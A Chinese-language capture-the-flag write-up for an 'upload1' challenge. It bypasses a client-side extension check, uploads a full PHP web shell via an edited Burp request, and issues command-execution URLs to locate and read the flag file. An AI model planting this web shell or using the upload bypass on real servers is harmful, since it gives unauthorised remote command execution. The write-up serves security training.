# upload1

本题是 `upload file` 的漏洞. 先观察 `source code`:

```js
<script type="text/javascript">
 

Array.prototype.contains = function (obj) {  
    var i = this.length;  
    while (i--) {  
        if (this[i] === obj) {  
            return true;  
        }  
    }  
    return false;  
}  

function check(){
upfile = document.getElementById("upfile");
submit = document.getElementById("submit");
name = upfile.value;
ext = name.replace(/^.+\./,'');

if(['jpg','png'].contains(ext)){
	submit.disabled = false;
}else{
	submit.disabled = true;

	alert('请选择一张图片文件上传!');
}


}
```

需要注意 `function check()`. 它把文件上传名字里的 `*.` 删除, 然后检查剩余字段里, 如果有 `jpg` 或 `png` 就接受上传, 相反就拒绝.

在网上找到一个简单的 `php shell` 脚本:

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```

使用 `Burp Suite` 改名文件和上传绕过 `check()`:

```
Content-Disposition: form-data; name="upfile"; filename="test.php"
Content-Type: image/jpeg

<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```

上传后我们可以 `RCE` 在 `/upload/` 中:

```
/upload/1643530437.test.php?cmd={命令}
```

找找 `flag`:

```
/upload/1643530437.test.php?cmd=find+/+-name+flag
```

没有数据返回, 奇怪, 那找一找文件名:

```
/upload/1643530437.test.php?cmd=find+/+-name+flag.*
```

返回 `/var/www/html/flag.php`. :))))) 最后, 读 `flag` 啦:

```
/upload/1643530437.test.php?cmd=cat+/var/www/html/flag.ph
```

一个小小的注意, 在 `URL` 中需要查看 `CTRL+U` 才会显示!
